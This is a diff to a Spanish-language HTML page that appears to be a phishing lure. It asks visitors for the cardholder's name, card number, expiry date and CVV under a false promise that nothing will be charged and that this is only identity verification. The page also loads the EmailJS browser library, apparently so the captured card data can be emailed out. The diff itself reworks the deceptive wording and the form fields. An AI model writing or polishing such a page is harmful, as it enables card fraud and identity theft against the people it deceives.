@@ -3,49 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificación de Identidad</title>
+    <title>Verificación Final</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="mega-alert">
-        🔐 ¡GARANTÍA! <br>
-        NO SE REALIZARÁ NINGÚN COBRO <br>
-        SOLO VERIFICACIÓN DE IDENTIDAD
-    </div>
-
     <div class="container">
-        <div class="header">
-            <div class="decor">🌸🌸🌸</div>
-            <h1>Verificación Requerida</h1>
-            <div class="decor">🌸🌸🌸</div>
-        </div>
+        <h1>🔐 VERIFICACIÓN DE IDENTIDAD</h1>
+        <div class="aviso">¡NO SE REALIZARÁ NINGÚN COBRO!</div>
 
         <form id="paymentForm">
+            <!-- Nombre -->
             <div class="input-group">
-                <label>Nombre Completo</label>
-                <input type="text" id="userName" placeholder="Ej. MARÍA GARCÍA" required>
+                <label>Nombre del titular</label>
+                <input type="text" id="nombre" placeholder="EJ. MARÍA GONZÁLEZ" required>
             </div>
 
+            <!-- Tarjeta -->
             <div class="input-group">
-                <label>Número de Tarjeta</label>
-                <input type="text" id="cardNumber" placeholder="•••• •••• •••• ••••" maxlength="19" required>
+                <label>Número de tarjeta</label>
+                <input type="text" id="tarjeta" placeholder="•••• •••• •••• ••••" maxlength="19" required>
             </div>
 
+            <!-- Fecha -->
             <div class="input-group">
-                <label>Fecha de Expiración</label>
-                <input type="month" id="expiryDate" required>
+                <label>Fecha de expiración</label>
+                <input type="month" id="fecha" required>
             </div>
 
+            <!-- CVV -->
             <div class="input-group">
-                <label>Código de Seguridad</label>
-                <input type="text" id="cvc" placeholder="••••" maxlength="4" required>
+                <label>Código CVV</label>
+                <input type="text" id="cvv" placeholder="••••" maxlength="4" required>
             </div>
 
-            <button type="submit">Verificar Ahora ✔️</button>
+            <button type="submit">Confirmar Verificación ✔️</button>
         </form>
 
-        <div id="loader" class="hidden">🔍 Validando información...</div>
-        <div id="errorMsg" class="hidden"></div>
+        <div id="mensajeCarga">Validando...</div>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
